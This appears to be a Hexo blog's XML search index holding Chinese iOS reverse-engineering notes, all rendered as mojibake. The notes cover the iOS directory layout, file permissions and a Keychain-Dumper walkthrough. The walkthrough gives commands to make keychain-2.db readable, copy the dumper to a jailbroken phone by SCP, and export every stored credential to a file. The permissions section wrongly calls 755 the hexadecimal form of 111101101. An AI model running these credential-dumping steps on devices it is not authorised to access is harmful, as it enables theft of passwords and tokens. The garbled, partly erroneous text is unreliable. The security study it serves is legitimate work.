Recorderå°±æ˜¯é€šè¿‡é€†å‘mediaserverdè¿™ä¸ªdaemonå®žçŽ°çš„ã€‚ æ€»ç»“ ç®€å•ä»‹ç»äº†å¸¸è§çš„äºŒè¿›åˆ¶æ–‡ä»¶ç±»åž‹ï¼Œå®ƒä»¬éƒ½æ˜¯App Storeå¼€å‘è€…ä¸éœ€è¦äº†è§£ä¹ŸæŽ¥è§¦ä¸åˆ°çš„çŸ¥è¯†ï¼Œåœ¨å­¦ä¹ iOSé€†å‘å·¥ç¨‹æ—¶å¾ˆå®¹æ˜“å½¢æˆæ¦‚å¿µç›²åŒºã€‚ æœ¬æ–‡æ—¨åœ¨ç§‘æ™®é‚£äº›åœ¨é€†å‘å·¥ç¨‹ä¸­éžå¸¸é‡è¦ä½†è‹¹æžœå®˜æ–¹é—­å£ä¸æçš„iOSç³»ç»Ÿçº§çŸ¥è¯†ç‚¹ï¼Œä»Žè€Œä¸ºAppStoreå¼€å‘è€…æ‰“å¼€iOSé€†å‘å·¥ç¨‹çš„è¿™æ‰‡çª—ã€‚ å‚è€ƒ æœ¬æ–‡æ‘˜å½•æ•´ç†è‡ªã€ŠiOSåº”ç”¨é€†å‘å·¥ç¨‹(ç¬¬2ç‰ˆ)ã€‹ä¸€ä¹¦, ä»¥ä¾¿å­¦ä¹ æŸ¥é˜…]]></content>
      <categories>
        <category>iOS</category>
        <category>é€†å‘ç¬”è®°</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>é€†å‘ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSé€†å‘ç¬”è®°ï¼ˆä¸€ï¼‰ï¼šiOSç›®å½•ç»“æž„ & æ–‡ä»¶æƒé™]]></title>
    <url>%2Farchives%2F971c1db6.html</url>
    <content type="text"><![CDATA[ç»æœ›æ˜¯æ— é™çš„ç¾Žå¥½ã€‚ â€”â€”çŽ‹å°æ³¢ ã€Šä¸‡å¯¿å¯ºã€‹ ç®€ä»‹ ç›¸è¾ƒäºŽiOSåº”ç”¨çš„é«˜å±‚è¡¨è±¡ï¼Œäººä»¬å¯¹å…¶åº•å±‚å®žçŽ°æ›´æ„Ÿå…´è¶£ï¼Œè¿™ä¹Ÿæ˜¯å¤§å®¶è¿›è¡Œé€†å‘å·¥ç¨‹çš„æºåŠ¨åŠ›ã€‚ä½†æ˜¯æˆ‘ä»¬ä¹Ÿéƒ½çŸ¥é“ï¼Œæœªè¶Šç‹±çš„iOSæ˜¯ä¸ªå°é—­çš„é»‘ç›’å­ï¼Œç›´åˆ°evad3rsã€ç›˜å¤ã€å¤ªæžç­‰å›¢é˜ŸæŠŠiOSè¶Šç‹±ä¹‹åŽï¼Œè¿™ä¸ªé»‘ç›’å­æ‰è¢«æ‰“å¼€ï¼Œç¥žç§˜çš„iOSå¾—ä»¥å®Œæ•´åœ°å±•çŽ°åœ¨æˆ‘ä»¬é¢å‰ã€‚ iOSç³»ç»Ÿç»“æž„ å¯¹äºŽæœªè¶Šç‹±çš„iOSï¼Œè‹¹æžœå®˜æ–¹å¼€æ”¾ç»™ç¬¬ä¸‰æ–¹ç›´æŽ¥è®¿é—®iOSæ–‡ä»¶ç³»ç»Ÿçš„æŽ¥å£éžå¸¸æœ‰é™ï¼Œå¼€å‘è€…åªéœ€è¦éµå¾ªè§„å®šï¼Œå‚è€ƒæ–‡æ¡£å³å¯å®Œæˆå·¥ä½œã€‚å› æ­¤ï¼Œçº¯ç²¹çš„AppStoreå¼€å‘è€…å¯èƒ½å¯¹iOSç³»ç»Ÿç»“æž„ä¸€æ— æ‰€çŸ¥ã€‚ å› ä¸ºæƒé™æžä½Žï¼Œæ¥è‡ªApp Storeçš„æ™®é€šAppï¼ˆä»¥ä¸‹ç®€ç§°StoreAppï¼‰ä¸èƒ½è®¿é—®è‡ªèº«ç›®å½•ä»¥å¤–çš„ç»å¤§å¤šæ•°æ–‡ä»¶ã€‚è€ŒiOSä¸€æ—¦è¶Šç‹±ï¼Œæ¥è‡ªCydiaçš„Appå°±å¯ä»¥æ‹¥æœ‰æ¯”StoreAppæ›´é«˜çš„æƒé™ï¼Œä»Žè€Œè®¿é—®å…¨ç³»ç»Ÿæ–‡ä»¶ã€‚ è¿˜å¯ä»¥åœ¨AFC2æœåŠ¡çš„å¸®åŠ©ä¸‹ï¼Œé€šè¿‡iFunBoxç­‰PCç«¯è½¯ä»¶è®¿é—®iOSå…¨ç³»ç»Ÿæ–‡ä»¶ iOSç›®å½•ç»“æž„ç®€ä»‹ iOSæ˜¯ç”±OSXæ¼”åŒ–è€Œæ¥çš„ï¼Œè€ŒOSXåˆ™æ˜¯åŸºäºŽUNIXæ“ä½œç³»ç»Ÿçš„ã€‚è¿™ä¸‰è€…è™½ç„¶æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œä½†å®ƒä»¬è¡€è„‰ç›¸è¿žã€‚ä»ŽFilesystem Hierarchy Standardå’Œhier(7)ä¸­ï¼Œå¯ä»¥ä¸€çª¥iOSç›®å½•ç»“æž„çš„è®¾è®¡æ ‡å‡†ã€‚ Filesystem Hierarchy Standardï¼ˆä»¥ä¸‹ç®€ç§°FHSï¼‰ä¸ºç±»UNIXæ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç›®å½•ç»“æž„åˆ¶å®šäº†ä¸€å¥—æ ‡å‡†ï¼Œå®ƒçš„åˆè¡·ä¹‹ä¸€æ˜¯è®©ç”¨æˆ·é¢„çŸ¥æ–‡ä»¶æˆ–ç›®å½•çš„å­˜æ”¾ä½ç½®ã€‚OSXåœ¨æ­¤åŸºç¡€ä¸Šå½¢æˆäº†è‡ªå·±çš„hier(7)æ¡†æž¶ã€‚ ç±»UNIXæ“ä½œç³»ç»Ÿçš„å¸¸è§ç›®å½•ç»“æž„å¦‚ä¸‹æ‰€ç¤ºã€‚ / ï¼šæ ¹ç›®å½•ï¼Œä»¥æ–œæ è¡¨ç¤ºï¼Œå…¶ä»–æ‰€æœ‰æ–‡ä»¶å’Œç›®å½•åœ¨æ ¹ç›®å½•ä¸‹å±•å¼€ã€‚ /bin ï¼šâ€œbinaryâ€çš„ç®€å†™ï¼Œå­˜æ”¾æä¾›ç”¨æˆ·çº§åŸºç¡€åŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚lsã€psç­‰ã€‚ /boot ï¼šå­˜æ”¾èƒ½ä½¿ç³»ç»ŸæˆåŠŸå¯åŠ¨çš„æ‰€æœ‰æ–‡ä»¶ã€‚iOSä¸­æ­¤ç›®å½•ä¸ºç©ºã€‚ /dev ï¼šâ€œdeviceâ€çš„ç®€å†™ï¼Œå­˜æ”¾BSDè®¾å¤‡æ–‡ä»¶ã€‚æ¯ä¸ªæ–‡ä»¶ä»£è¡¨ç³»ç»Ÿçš„ä¸€ä¸ªå—è®¾å¤‡æˆ–å­—ç¬¦è®¾å¤‡ï¼Œä¸€èˆ¬æ¥è¯´ï¼Œâ€œå—è®¾å¤‡â€ä»¥å—ä¸ºå•ä½ä¼ è¾“æ•°æ®ï¼Œå¦‚ç¡¬ç›˜ï¼›è€Œâ€œå­—ç¬¦è®¾å¤‡â€ä»¥å­—ç¬¦ä¸ºå•ä½ä¼ è¾“æ•°æ®ï¼Œå¦‚è°ƒåˆ¶è§£è°ƒå™¨ã€‚ /sbin ï¼šâ€œsystem binariesâ€çš„ç®€å†™ï¼Œå­˜æ”¾æä¾›ç³»ç»Ÿçº§åŸºç¡€åŠŸèƒ½çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¦‚netstatã€rebootç­‰ã€‚ /etc ï¼šâ€œEt Ceteraâ€çš„ç®€å†™ï¼Œå­˜æ”¾ç³»ç»Ÿè„šæœ¬åŠé…ç½®æ–‡ä»¶ï¼Œå¦‚passwdã€hostsç­‰ã€‚åœ¨iOSä¸­ï¼Œ/etcæ˜¯ä¸€ä¸ªç¬¦å·é“¾æŽ¥ï¼Œå®žé™…æŒ‡å‘/private/etcã€‚ /lib ï¼šå­˜æ”¾ç³»ç»Ÿåº“æ–‡ä»¶ã€å†…æ ¸æ¨¡å—åŠè®¾å¤‡é©±åŠ¨ç­‰ã€‚iOSä¸­æ­¤ç›®å½•ä¸ºç©ºã€‚ /mnt ï¼šâ€œmountâ€çš„ç®€å†™ï¼Œå­˜æ”¾ä¸´æ—¶çš„æ–‡ä»¶ç³»ç»ŸæŒ‚è½½ç‚¹ã€‚iOSä¸­æ­¤ç›®å½•ä¸ºç©ºã€‚ /private ï¼šå­˜æ”¾ä¸¤ä¸ªç›®å½•ï¼Œåˆ†åˆ«æ˜¯/private/etcå’Œ/private/varã€‚ /tmp ï¼šä¸´æ—¶ç›®å½•ã€‚åœ¨iOSä¸­ï¼Œ/tmpæ˜¯ä¸€ä¸ªç¬¦å·é“¾æŽ¥ï¼Œå®žé™…æŒ‡å‘/private/var/tmpã€‚ /usr ï¼šåŒ…å«äº†å¤§å¤šæ•°ç”¨æˆ·å·¥å…·å’Œç¨‹åºã€‚/usr/binåŒ…å«é‚£äº›/binå’Œ/sbinä¸­æœªå‡ºçŽ°çš„åŸºç¡€åŠŸèƒ½ï¼Œå¦‚nmã€killallç­‰ï¼›/usr/includeåŒ…å«æ‰€æœ‰çš„æ ‡å‡†Cå¤´æ–‡ä»¶ï¼›/usr/libå­˜æ”¾åº“æ–‡ä»¶ã€‚ /var ï¼šâ€œvariableâ€çš„ç®€å†™ï¼Œå­˜æ”¾ä¸€äº›ç»å¸¸æ›´æ”¹çš„æ–‡ä»¶ï¼Œæ¯”å¦‚æ—¥å¿—ã€ç”¨æˆ·æ•°æ®ã€ä¸´æ—¶æ–‡ä»¶ç­‰ã€‚å…¶ä¸­/var/mobileå’Œ/var/rootåˆ†åˆ«å­˜æ”¾äº†mobileç”¨æˆ·å’Œrootç”¨æˆ·çš„æ–‡ä»¶ï¼Œæ˜¯é‡ç‚¹å…³æ³¨çš„ç›®å½•ã€‚ ä½œä¸ºiOSå¼€å‘è€…ï¼Œæ—¥å¸¸æ“ä½œæ‰€å¯¹åº”çš„åŠŸèƒ½æ¨¡å—å¤§å¤šæ¥è‡ªiOSçš„ç‹¬æœ‰ç›®å½• /Applications ï¼šå­˜æ”¾æ‰€æœ‰çš„ç³»ç»ŸAppå’Œæ¥è‡ªäºŽCydiaçš„Appï¼Œä¸åŒ…æ‹¬StoreApp /Developer ï¼šå¦‚æžœä¸€å°è®¾å¤‡è¿žæŽ¥XcodeåŽè¢«æŒ‡å®šä¸ºè°ƒè¯•ç”¨æœºï¼ŒXcodeå°±ä¼šåœ¨iOSä¸­ç”Ÿæˆè¿™ä¸ªç›®å½•ï¼Œå…¶ä¸­ä¼šå«æœ‰ä¸€äº›è°ƒè¯•éœ€è¦çš„å·¥å…·å’Œæ•°æ® /Library ï¼šå­˜æ”¾ä¸€äº›æä¾›ç³»ç»Ÿæ”¯æŒçš„æ•°æ®ã€‚å…¶ä¸­/Library/MobileSubstrateä¸‹å­˜æ”¾äº†æ‰€æœ‰åŸºäºŽCydiaSubstrateï¼ˆåŽŸåMobileSubstrateï¼‰çš„æ’ä»¶ã€‚ /System/Library ï¼šiOSæ–‡ä»¶ç³»ç»Ÿä¸­æœ€é‡è¦çš„ç›®å½•ä¹‹ä¸€ï¼Œå­˜æ”¾å¤§é‡ç³»ç»Ÿç»„ä»¶ã€‚ /System/Library/Frameworkså’Œ/System/Library/PrivateFrameworksï¼šå­˜æ”¾iOSä¸­çš„å„ç§frameworkï¼Œå…¶ä¸­å‡ºçŽ°åœ¨SDKæ–‡æ¡£é‡Œçš„åªæ˜¯å†°å±±ä¸€è§’ï¼Œè¿˜æœ‰æ•°ä¸æ¸…çš„æœªå…¬å¼€åŠŸèƒ½ç­‰å¾…æˆ‘ä»¬åŽ»æŒ–æŽ˜ã€‚ /System/Library/CoreServicesé‡Œçš„SpringBoard.appï¼šiOSæ¡Œé¢ç®¡ç†å™¨ï¼ˆç±»ä¼¼äºŽWindowsé‡Œçš„explorerï¼‰ï¼Œæ˜¯ç”¨æˆ·ä¸Žç³»ç»Ÿäº¤æµçš„æœ€é‡è¦ä¸­ä»‹ /User ï¼šç”¨æˆ·ç›®å½•ï¼Œå®žé™…æŒ‡å‘/var/mobileï¼Œè¿™ä¸ªç›®å½•é‡Œå­˜æ”¾å¤§é‡ç”¨æˆ·æ•°æ®ï¼Œæ¯”å¦‚ï¼š /var/mobile/Media/DCIMä¸‹å­˜æ”¾ç…§ç‰‡ï¼› /var/mobile/Media/Recordingsä¸‹å­˜æ”¾å½•éŸ³æ–‡ä»¶ï¼› /var/mobile/Library/SMSä¸‹å­˜æ”¾çŸ­ä¿¡æ•°æ®åº“ï¼› /var/mobile/Library/Mailä¸‹å­˜æ”¾é‚®ä»¶æ•°æ®ã€‚ æ³¨æ„ å¦å¤–ä¸€ä¸ªéžå¸¸é‡è¦çš„å­ç›®å½•æ˜¯/var/mobile/Containersï¼Œå­˜æ”¾StoreAppã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒAppçš„å¯æ‰§è¡Œæ–‡ä»¶åœ¨bundleä¸ŽAppä¸­çš„æ•°æ®ç›®å½•è¢«åˆ†åˆ«å­˜æ”¾åœ¨/var/mobile/Containers/Bundleå’Œ/var/mobile/Containers/Dataè¿™ä¸¤ä¸ªä¸åŒç›®å½•ä¸‹ã€‚ iOSæ–‡ä»¶æƒé™ç®€ä»‹ iOSæ˜¯ä¸€ä¸ªå¤šç”¨æˆ·æ“ä½œç³»ç»Ÿã€‚â€œç”¨æˆ·â€æ˜¯ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œå®ƒä»£è¡¨å¯¹æ“ä½œç³»ç»Ÿçš„æ‰€æœ‰æƒå’Œä½¿ç”¨æƒã€‚æ¯”å¦‚ï¼Œmobileç”¨æˆ·æ— æ³•è°ƒç”¨rebootå‘½ä»¤é‡å¯iOSï¼Œè€Œrootç”¨æˆ·å´å¯ä»¥ï¼›â€œç»„â€æ˜¯ç”¨æˆ·çš„ä¸€ç§ç»„ç»‡æ–¹å¼ï¼Œä¸€ä¸ªç»„å¯ä»¥åŒ…å«å¤šä¸ªç”¨æˆ·ï¼Œä¸€ä¸ªç”¨æˆ·ä¹Ÿå¯ä»¥å±žäºŽå¤šä¸ªç»„ã€‚ iOSä¸­çš„æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰ä¸€ä¸ªå±žä¸»ç”¨æˆ·å’Œä¸€ä¸ªå±žä¸»ç»„ï¼Œæˆ–è€…è¯´è¿™ä¸ªç”¨æˆ·å’Œè¿™ä¸ªç»„æ‹¥æœ‰è¿™ä¸ªæ–‡ä»¶ï¼›æ¯ä¸ªæ–‡ä»¶éƒ½å…·æœ‰ä¸€ç³»åˆ—æƒé™ï¼Œç®€å•åœ°è¯´ï¼Œæƒé™çš„ä½œç”¨åœ¨äºŽè¯´æ˜Žæ–‡ä»¶çš„å±žä¸»ç”¨æˆ·èƒ½åšä»€ä¹ˆï¼Œå±žä¸»ç»„èƒ½åšä»€ä¹ˆï¼Œä»¥åŠå…¶ä»–æ‰€æœ‰äººèƒ½åšä»€ä¹ˆã€‚iOSç”¨3ä½ï¼ˆbitï¼‰æ¥è¡¨ç¤ºæ–‡ä»¶çš„æƒé™ï¼Œä»Žé«˜ä½åˆ°ä½Žä½åˆ†åˆ«æ˜¯rï¼ˆreadï¼‰æƒé™ã€wï¼ˆwriteï¼‰æƒé™ï¼Œä»¥åŠxï¼ˆexecuteï¼‰æƒé™ã€‚æ–‡ä»¶ä¸Žç”¨æˆ·çš„å…³ç³»å­˜åœ¨ä»¥ä¸‹ä¸‰ç§å¯èƒ½æ€§ï¼š æ­¤ç”¨æˆ·æ˜¯å±žä¸»ç”¨æˆ·ï¼› æ­¤ç”¨æˆ·ä¸æ˜¯å±žä¸»ç”¨æˆ·ï¼Œä½†åœ¨å±žä¸»ç»„é‡Œï¼› æ­¤ç”¨æˆ·æ—¢ä¸æ˜¯å±žä¸»ç”¨æˆ·ï¼Œåˆä¸åœ¨å±žä¸»ç»„é‡Œã€‚ æ‰€ä»¥éœ€è¦ç”¨3*3ä½æ¥è¡¨ç¤ºä¸€ä¸ªæ–‡ä»¶çš„æƒé™ï¼Œå¦‚æžœæŸä¸€ä½ä¸º1ï¼Œåˆ™è¿™ä¸€ä½ä»£è¡¨çš„æƒé™ç”Ÿæ•ˆï¼Œå¦åˆ™æ— æ•ˆã€‚ä¾‹å¦‚ï¼Œ111101101ä»£è¡¨rwxr-xr-xï¼Œå³è¯¥æ–‡ä»¶çš„å±žä¸»ç”¨æˆ·æ‹¥æœ‰rã€wã€xæƒé™ï¼Œè€Œå±žä¸»ç»„å’Œå…¶ä»–æ‰€æœ‰äººåªå…·æœ‰rå’Œxæƒé™ï¼›åŒæ—¶ï¼ŒäºŒè¿›åˆ¶çš„111101101è½¬æ¢æˆåå…­è¿›åˆ¶æ˜¯755ï¼Œä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„æƒé™è¡¨ç¤ºæ³•ã€‚ äº‹å®žä¸Šï¼Œé™¤rã€wã€xæƒé™å¤–ï¼Œæ–‡ä»¶è¿˜å¯ä»¥æ‹¥æœ‰SUIDã€SGIDå’Œstickyç­‰ç‰¹æ®Šæƒé™ï¼Œå®ƒä»¬çš„åº”ç”¨é¢‘çŽ‡ä¸é«˜ï¼Œå› æ­¤ä¸å ç”¨å•ç‹¬çš„æƒé™ä½ï¼Œè€Œæ˜¯ä»¥ç®€åŒ–å½¢å¼å‡ºçŽ°åœ¨xæƒé™æ‰€åœ¨çš„æƒé™ä½ä¸­ã€‚ å‚è€ƒ æœ¬æ–‡æ‘˜å½•æ•´ç†è‡ªã€ŠiOSåº”ç”¨é€†å‘å·¥ç¨‹(ç¬¬2ç‰ˆ)ã€‹ä¸€ä¹¦]]></content>
      <categories>
        <category>iOS</category>
        <category>é€†å‘ç¬”è®°</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>é€†å‘ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆäº”ï¼‰ï¼šä½¿ç”¨Keychain-Dumperå¯¼å‡ºkeychainæ•°æ®]]></title>
    <url>%2Farchives%2F65ed9c65.html</url>
    <content type="text"><![CDATA[ç”Ÿä¸ºå†°å±±ï¼Œå°±è¯¥æ·¡æ·¡åœ°çˆ±æµ·æµã€çˆ±é£Žï¼Œå¹¶ä¸”åœ¨å¶ç„¶æŽ¥è§¦æ—¶ï¼Œå…¨å¿ƒå…¨æ„åœ°çˆ±å¦ä¸€å—å†°å±±ã€‚ â€”â€”çŽ‹å°æ³¢ ã€Šä¼¼æ°´æŸ”æƒ…ã€‹ ç®€ä»‹ æ ¹æ®è‹¹æžœçš„ä»‹ç»ï¼ŒiOSè®¾å¤‡ä¸­çš„Keychainæ˜¯ä¸€ä¸ªå®‰å…¨çš„å­˜å‚¨å®¹å™¨ï¼Œå¯ä»¥ç”¨æ¥ä¸ºä¸åŒåº”ç”¨ä¿å­˜æ•æ„Ÿä¿¡æ¯æ¯”å¦‚ç”¨æˆ·åï¼Œå¯†ç ï¼Œç½‘ç»œå¯†ç ï¼Œè®¤è¯ä»¤ç‰Œã€‚è‹¹æžœè‡ªå·±ç”¨keychainæ¥ä¿å­˜Wi-Fiç½‘ç»œå¯†ç ï¼ŒVPNå‡­è¯ç­‰ç­‰ã€‚å®ƒæ˜¯ä¸€ä¸ªåœ¨æ‰€æœ‰appä¹‹å¤–çš„sqliteæ•°æ®åº“ã€‚ keychainå¯ä»¥è¯´æ˜¯ç³»ç»Ÿé‡Œå”¯ä¸€å¯ä»¥åšåˆ°å®‰å…¨å¯é å­˜å‚¨åº”ç”¨æ•æ„Ÿæ•°æ®å¹¶ä¸”å¯ä»¥åœ¨åº”ç”¨å¸è½½æˆ–é‡æ–°å®‰è£…æ—¶ä»ç„¶ä¿ç•™å…¶æ•°æ®çš„åœ°æ–¹ã€‚å½“ä½¿ç”¨itunesè¿›è¡Œæ•°æ®å¤‡ä»½æ—¶ï¼Œæ¯ä¸ªåº”ç”¨ç¨‹åºåœ¨keychainé‡Œçš„æ•°æ®éƒ½ä¼šå¾—åˆ°å¤‡ä»½,è€Œä¸”å¤‡ä»½çš„æ•°æ®æ˜¯ç»è¿‡åŠ å¯†çš„ã€‚ é‰´äºŽkeychainçš„è¿™äº›ç‰¹æ€§ï¼Œä½¿å¾—å®ƒæˆä¸ºå¼€å‘è€…å­˜å‚¨åº”ç”¨æ•æ„Ÿæ•°æ®çš„é¦–é€‰ï¼Œåº”ç”¨ç¨‹åºå¸¸è§çš„æ•æ„Ÿæ•°æ®é€šå¸¸æœ‰å¯†ç ï¼Œç§˜é’¥ç­‰ç­‰ã€‚ ä½†æ˜¯ï¼Œä»¥ä¸Šæ‰€è®¨è®ºçš„å®‰å…¨ä»…é™äºŽæ‰‹æœºä¸è¶Šç‹±ä¸ºå‰æï¼ï¼å¦‚æžœæ‰‹æœºè¶Šç‹±æˆ‘ä»¬å¯ä»¥ä½¿ç”¨Keychain-DumperèŽ·å–åˆ°KeyChainä¸­çš„æ‰€æœ‰æ•°æ®ï¼Œä¸çŸ¥é“æ˜¯ç®—å¹¸è¿è¿˜æ˜¯ä¸å¹¸ã€‚ æ‰€æœ‰èµ„æ–™æ–‡ä»¶&amp;å·¥å…·åœ¨è¿™é‡Œ äº†è§£æ›´å¤šï¼š iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± &amp; SSH iOSæ”»é˜²ï¼ˆäºŒï¼‰ï¼šçªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ &amp; å·çª¥ç”¨æˆ·å®‰è£…åº”ç”¨åˆ—è¡¨ &amp; Netcatä½¿ç”¨ iOSæ”»é˜²ï¼ˆä¸‰ï¼‰ï¼šé…ç½®ä½¿ç”¨Revealå·¥å…·é€†å‘åˆ«äººçš„App UIç•Œé¢ iOSæ”»é˜²ï¼ˆå››ï¼‰ï¼šä½¿ç”¨Dumpdecrypted ç ¸å£³ &amp; class-dump å¯¼å‡ºå¤´æ–‡ä»¶ KeyChainæ•°æ®åº“æƒé™KeyChainæ•°æ®åº“ æ‰€æœ‰å­˜å‚¨åœ¨KeyChainä¸­çš„æ•°æ®ï¼Œå®žé™…ä¸Šæ˜¯ä¿å­˜åœ¨ä¸€ä¸ªkeychain-2.dbçš„æ•°æ®åº“ä¸­ã€‚ è¯¥æ•°æ®åº“ä½äºŽ/private/var/Keychains/ç›®å½•ä¸‹ã€‚ æ›´æ”¹æƒé™ é»˜è®¤æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½éƒ½è¯»å–keychain-2.dbæ•°æ®åº“çš„ï¼Œæ‰€ä»¥éœ€è¦å…ˆèµ‹äºˆå…¶å¯è¯»æƒé™ã€‚ Terminalé€šè¿‡SSHç™»å½•æ‰‹æœº è¿›å…¥Keychainsç›®å½• ç»™keychain-2.dbæ•°æ®åº“å¯è¯»æƒé™ 123cd /private/var/Keychains/chmod +r keychain-2.db Keychain-Dumperä¸‹è½½å®‰è£…Keychain-Dumper ä¸‹è½½Keychain-Dumper Keychain-Dumperçš„ç®€å•ä½¿ç”¨Keychain-Dumperå¯æ‰§è¡Œæ–‡ä»¶ä¼ è¾“è‡³æ‰‹æœº å°†ä¸‹è½½çš„Keychain-Dumperæ–‡ä»¶å¤¹å†…çš„keychain_dumperå¯æ‰§è¡Œæ–‡ä»¶ä¼ è¾“è‡³æ‰‹æœºæŒ‡å®šè·¯å¾„ï¼Œå¦‚æˆ‘æ”¾åœ¨æ‰‹æœº/binç›®å½•ä¸‹ å¯ä»¥ä½¿ç”¨ç”µè„‘åŠ©æ‰‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æŒ‡ä»¤æ“ä½œå¦‚ä¸‹ï¼š 123exit // é€€å‡ºSSHè¿žæŽ¥æ‰‹æœºscp ~/Desktop/Keychain-Dumper/keychain_dumper root@192.168.1.60:/bin/keychain_dumper å¯¼å‡ºKeyChainæ•°æ® ä½¿ç”¨SSHè¿žæŽ¥æ‰‹æœºï¼Œè¿›å…¥Rootç›®å½• å¯ä»¥ç›´æŽ¥æ‰§è¡Œä¸Šä¸€æ­¥ä¼ è¾“çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¼šåœ¨ç»ˆç«¯ç›´æŽ¥è¾“å‡ºdumperçš„KeyChainå†…å®¹ã€‚ 1./keychain_dumper ä¹Ÿå¯ä»¥æ‰§è¡Œä¸Šä¸€æ­¥ä¼ è¾“çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¹¶å¯¼å‡ºä¸ºtxtæ–‡æœ¬æ–¹ä¾¿æŸ¥çœ‹ 1/bin/keychain_dumper &gt; keychain-export.txt å°†å¯¼å‡ºçš„æ–‡æœ¬æ–‡ä»¶ï¼Œä¼ è¾“è‡³ç”µè„‘ä¸ŠæŸ¥çœ‹, å¯ä»¥ä½¿ç”¨ç”µè„‘åŠ©æ‰‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å‘½ä»¤æ“ä½œå¦‚ä¸‹ï¼š 12cd /binscp root@192.168.1.60:keychain-export.txt ~/Desktop/keychain-export.txt æ‰“å¼€æ–‡æœ¬æ–‡ä»¶å¯ä»¥å‘çŽ°ï¼Œæˆ‘ä»¬çš„çš„KeyChainå­˜å‚¨çš„æ•°æ®åœ¨è¿™é‡Œä¸€è§ˆæ— é—ï¼Œå¦‚æžœæ˜¯æ•æ„Ÿä¿¡æ¯è¢«åˆ«äººç ´è§£ï¼Œé‚£ä¹ˆåŽæžœâ€¦ å‚è€ƒ iOSå®‰å…¨æ”»é˜²ï¼ˆä¹ï¼‰ï¼šä½¿ç”¨Keychain-Dumperå¯¼å‡ºkeychainæ•°æ® Keychain Dumper]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆå››ï¼‰ï¼šä½¿ç”¨Dumpdecrypted ç ¸å£³ & class-dump å¯¼å‡ºå¤´æ–‡ä»¶]]></title>
    <url>%2Farchives%2F8c50aab9.html</url>
    <content type="text"><![CDATA[æˆ‘å‘æ¥ä¸æ€•å¾—ç½ªæœ‹å‹ï¼Œå› ä¸ºæ—¢æ˜¯æœ‹å‹ï¼Œå°±ä¸æ€•å¾—ç½ªï¼Œä¸èƒ½å¾—ç½ªçš„å°±ä¸æ˜¯æœ‹å‹ï¼Œè¿™æ˜¯æˆ‘çš„ä¸€è´¯ä½œé£Žã€‚ç”±è¿™ä¸€ç‚¹ä½ ä¹Ÿå¯çŒœå‡ºï¼Œæˆ‘çš„æœ‹å‹ä¸ºä»€ä¹ˆè¿™ä¹ˆå°‘ã€‚ â€”â€”çŽ‹å°æ³¢ã€Šä¼¼æ°´æµå¹´ã€‹ ç®€ä»‹ class-dumpæ˜¯ç”¨æ¥dumpç›®æ ‡å¯¹è±¡çš„å¤´æ–‡ä»¶ä¿¡æ¯çš„å·¥å…·ã€‚å®ƒåˆ©ç”¨Objective-Cè¯­è¨€çš„runtimeçš„ç‰¹æ€§ï¼Œå°†å­˜å‚¨åœ¨mach-Oæ–‡ä»¶ä¸­çš„ç±»/åˆ†ç±»/åè®®ç­‰å¤´æ–‡ä»¶ä¿¡æ¯æå–å‡ºæ¥å¹¶ç”Ÿäº§.hæ–‡ä»¶ã€‚ ä»ŽAppStoreä¸‹è½½çš„Appæ˜¯è¢«è‹¹æžœåŠ å¯†è¿‡çš„ï¼Œå¯æ‰§è¡Œæ–‡ä»¶è¢«å¥—ä¸Šäº†ä¸€å±‚ä¿æŠ¤å£³ï¼Œ è€Œclass-dumpæ— æ³•ä½œç”¨äºŽåŠ å¯†è¿‡çš„Appã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæƒ³è¦èŽ·å–å¤´æ–‡ä»¶ï¼Œéœ€è¦å…ˆè§£å¯†Appçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¿—ç§°â€œç ¸å£³â€ã€‚ dumpdecryptedå°±æ˜¯ç”±è¶Šç‹±ç¤¾åŒºçš„çŸ¥åäººå£«Stefan Esserå‡ºå“çš„ä¸€æ¬¾ç ¸å£³å·¥å…·ï¼Œè¢«å¹¿æ³›è¿ç”¨åœ¨iOSé€†å‘å·¥ç¨‹ç ”ç©¶ä¸­ã€‚ æ³¨æ„ï¼šå¦‚æžœä¸ç ¸å£³ï¼Œç›´æŽ¥ä½¿ç”¨class-dumpçŽ°åœ¨å·²ç»æ— æ³•dumpå‡ºå¤´æ–‡ä»¶çš„ï¼ˆä¹‹å‰å¯ä»¥dumpå‡ºå¤´æ–‡ä»¶ä½†æ˜¯æ˜¯åŠ å¯†çš„ï¼‰ï¼Œåªä¼šç”Ÿæˆä¸€ä¸ªCDStructures.hæ–‡ä»¶. æ‰€æœ‰èµ„æ–™æ–‡ä»¶&amp;å·¥å…·åœ¨è¿™é‡Œ äº†è§£æ›´å¤šï¼š iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± &amp; SSH iOSæ”»é˜²ï¼ˆäºŒï¼‰ï¼šçªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ &amp; å·çª¥ç”¨æˆ·å®‰è£…åº”ç”¨åˆ—è¡¨ &amp; Netcatä½¿ç”¨ 